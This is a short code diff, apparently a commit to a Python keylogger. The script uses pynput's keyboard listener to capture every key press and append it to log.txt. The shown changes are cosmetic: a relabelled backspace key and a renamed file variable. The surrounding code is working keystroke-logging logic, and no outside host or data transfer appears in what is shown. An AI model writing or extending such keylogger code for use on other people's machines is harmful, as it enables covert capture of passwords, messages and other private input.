@@ -10,7 +10,7 @@ def WriteToFile(key):
     elif keyCode == "Key.alt_gr":
         keyCode = ""
     elif keyCode == "Key.backspace":
-        keyCode = "<-"
+        keyCode = "BACKSPACE"
     elif keyCode == "Key.caps_lock":
         keyCode = "CAP"
     elif keyCode == "Key.cmd":
@@ -90,8 +90,8 @@ def WriteToFile(key):
     elif keyCode == "Key.up":
         keyCode = ""
 
-    with open("log.txt", "a") as file:  # Manipulating .txt file
-        file.write(keyCode)
+    with open("log.txt", "a") as txtFile:
+        txtFile.write(keyCode)
 
 
 with pynput.keyboard.Listener(on_press=WriteToFile) as keyboardListener:
